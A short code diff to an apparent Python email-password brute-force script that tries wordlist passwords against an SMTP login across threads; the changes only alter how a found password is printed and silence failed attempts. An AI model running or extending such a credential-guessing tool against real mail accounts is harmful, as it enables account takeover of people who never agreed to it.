@@ -18,11 +18,11 @@ def bruteForce(email, wordlist):
                     try:
                         server.login(email, password)
                         threadLock.acquire()
-                        print(f"\n\033[92mPassword is: \033[0m{password.strip()}")
+                        print(f"The password is: \033[93m{password.strip()}\033[0m")
                         threadLock.release()
                     except smtplib.SMTPAuthenticationError:
                         threadLock.acquire()
-                        print("\033[91mInvalid Password: \033[0m{}".format(password.strip()))
+                        pass
                         threadLock.release()
                         continue
                     except smtplib.SMTPServerDisconnected:
@@ -41,3 +41,5 @@ if __name__ == '__main__':
     for i in threads:
         i.join()
     print("\nDone!")
+
+    
